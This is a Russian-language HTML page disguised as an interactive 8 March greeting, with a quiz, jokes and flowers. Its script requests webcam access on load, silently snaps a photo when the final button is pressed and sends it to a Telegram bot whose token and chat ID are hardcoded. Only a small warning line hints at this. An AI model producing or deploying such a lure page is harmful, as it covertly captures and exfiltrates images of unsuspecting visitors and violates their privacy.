<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>–° 8 –º–∞—Ä—Ç–∞!</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            margin: 10px;
        }
        .hidden {
            display: none;
        }
        .flowers {
            font-size: 50px;
            margin-top: 20px;
        }
        #video {
            margin: 20px auto;
            display: block;
        }
        #cameraWarning {
            color: red;
            font-weight: bold;
            margin-top: 20px;
        }
    </style>
</head>
<body>

    <!-- –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –æ —Ñ–æ—Ç–æ -->
    <div id="cameraWarning">–í–Ω–∏–º–∞–Ω–∏–µ! –ü—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ –Ω–∞ –∫–Ω–æ–ø–∫–∏ –≤–∞—Å –º–æ–≥—É—Ç —Å—Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—Ä–æ–≤–∞—Ç—å.</div>

    <!-- –°—Ç—Ä–∞–Ω–∏—Ü–∞ 1 -->
    <div id="page1">
        <h1>–¢—ã –∂–µ–Ω—â–∏–Ω–∞?</h1>
        <button onclick="goToPage2()">–î–∞</button>
        <button onclick="goToPage2()">–ù–µ—Ç</button>
    </div>

    <!-- –°—Ç—Ä–∞–Ω–∏—Ü–∞ 2 -->
    <div id="page2" class="hidden">
        <h1>–ü—Ä–∞–≤–∏–ª—å–Ω–æ! –¢—ã –∂–µ –¥–µ–≤—É—à–∫–∞! –ü—Ä–æ–¥–æ–ª–∂–∏–º?</h1>
        <button onclick="goToPage3()">–ü—Ä–æ–¥–æ–ª–∂–∏–º</button>
    </div>

    <!-- –°—Ç—Ä–∞–Ω–∏—Ü–∞ 3 -->
    <div id="page3" class="hidden">
        <h1>–û—Ç–≤–µ—Ç—å –Ω–∞ –≤–æ–ø—Ä–æ—Å—ã:</h1>
        <p>1. –ö–∞–∫–æ–π —Ü–≤–µ—Ç–æ–∫ —Å–∏–º–≤–æ–ª–∏–∑–∏—Ä—É–µ—Ç 8 –º–∞—Ä—Ç–∞?</p>
        <button onclick="checkAnswer(1, 'right')">–¢—é–ª—å–ø–∞–Ω</button>
        <button onclick="checkAnswer(1, 'wrong')">–†–æ–∑–∞</button>
        <p>2. –ö–∞–∫–æ–π –ø–æ–¥–∞—Ä–æ–∫ —Å–∞–º—ã–π –ø–æ–ø—É–ª—è—Ä–Ω—ã–π –Ω–∞ 8 –º–∞—Ä—Ç–∞?</p>
        <button onclick="checkAnswer(2, 'right')">–¶–≤–µ—Ç—ã</button>
        <button onclick="checkAnswer(2, 'wrong')">–®–æ–∫–æ–ª–∞–¥</button>
        <p id="result"></p>
    </div>

    <!-- –°—Ç—Ä–∞–Ω–∏—Ü–∞ 4 -->
    <div id="page4" class="hidden">
        <h1>–ê–Ω–µ–∫–¥–æ—Ç—ã:</h1>
        <p id="joke1">–ü–æ—á–µ–º—É –∂–µ–Ω—â–∏–Ω—ã –ª—é–±—è—Ç 8 –º–∞—Ä—Ç–∞? –ü–æ—Ç–æ–º—É —á—Ç–æ —ç—Ç–æ –∏—Ö –¥–µ–Ω—å!</p>
        <p id="joke2" class="hidden">–ß—Ç–æ —Å–∫–∞–∑–∞–ª –º—É–∂—á–∏–Ω–∞, –∫–æ–≥–¥–∞ —É–≤–∏–¥–µ–ª —Ü–≤–µ—Ç—ã? "–û–ø—è—Ç—å 8 –º–∞—Ä—Ç–∞!"</p>
        <button id="nextButton" class="hidden" onclick="goToPage5()">–î–∞–ª—å—à–µ</button>
    </div>

    <!-- –°—Ç—Ä–∞–Ω–∏—Ü–∞ 5 -->
    <div id="page5" class="hidden">
        <h1>–° 8 –º–∞—Ä—Ç–∞!</h1>
        <p>–ü—É—Å—Ç—å —ç—Ç–æ—Ç –¥–µ–Ω—å –ø—Ä–∏–Ω–µ—Å–µ—Ç –≤–∞–º —Ä–∞–¥–æ—Å—Ç—å –∏ —Å—á–∞—Å—Ç—å–µ!</p>
        <button id="giftButton" class="hidden" onclick="showFlowers()">–ü–æ–¥–∞—Ä–æ–∫</button>
        <div id="flowers" class="hidden flowers">üå∏üå∫üå∑</div>
        <button id="endButton" class="hidden" onclick="end()">–ö–æ–Ω–µ—Ü!</button>
    </div>

    <!-- –ö–∞–º–µ—Ä–∞ -->
    <div id="cameraSection" class="hidden">
        <video id="video" width="320" height="240" autoplay></video>
        <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
    </div>

    <script>
        let correctAnswers = 0;

        function goToPage2() {
            document.getElementById('page1').classList.add('hidden');
            document.getElementById('page2').classList.remove('hidden');
        }

        function goToPage3() {
            document.getElementById('page2').classList.add('hidden');
            document.getElementById('page3').classList.remove('hidden');
        }

        function checkAnswer(question, answer) {
            if (answer === 'right') {
                correctAnswers++;
            }
            if (correctAnswers === 2) {
                document.getElementById('result').innerText = '–í—Å–µ –æ—Ç–≤–µ—Ç—ã –≤–µ—Ä–Ω—ã!';
                setTimeout(() => {
                    document.getElementById('page3').classList.add('hidden');
                    document.getElementById('page4').classList.remove('hidden');
                    setTimeout(() => {
                        document.getElementById('joke2').classList.remove('hidden');
                    }, 8000);
                    setTimeout(() => {
                        document.getElementById('nextButton').classList.remove('hidden');
                    }, 15000);
                }, 1000);
            }
        }

        function goToPage5() {
            document.getElementById('page4').classList.add('hidden');
            document.getElementById('page5').classList.remove('hidden');
            setTimeout(() => {
                document.getElementById('giftButton').classList.remove('hidden');
            }, 3000);
        }

        function showFlowers() {
            document.getElementById('flowers').classList.remove('hidden');
            document.getElementById('endButton').classList.remove('hidden');
        }

        function end() {
            takePhoto(); // –î–µ–ª–∞–µ–º —Ñ–æ—Ç–æ –ø–µ—Ä–µ–¥ –∑–∞–∫—Ä—ã—Ç–∏–µ–º
            alert('–°–ø–∞—Å–∏–±–æ –∑–∞ –≤–Ω–∏–º–∞–Ω–∏–µ!');
            window.close();
        }

        // –ö–∞–º–µ—Ä–∞
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        navigator.mediaDevices.getUserMedia({ video: true })
            .then((stream) => {
                video.srcObject = stream;
            })
            .catch((err) => {
                console.error("–ö–∞–º–µ—Ä–∞ –Ω–µ –¥–æ—Å—Ç—É–ø–Ω–∞: ", err);
            });

        function takePhoto() {
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 320, 240);
            const photo = canvas.toDataURL('image/png');
            sendPhotoToTelegram(photo);
        }

        function sendPhotoToTelegram(photo) {
            const botToken = '7775382090:AAHQZFuQxFHTZaGmKXMoFvQYSMJ77XDFAyY'; // –ó–∞–º–µ–Ω–∏ –Ω–∞ —Ç–æ–∫–µ–Ω —Å–≤–æ–µ–≥–æ –±–æ—Ç–∞
            const chatId = '6896228873'; // –ó–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π chat_id
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', photo);

            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => console.log(data))
            .catch(error => console.error(error));
        }
    </script>
</body>
</html>
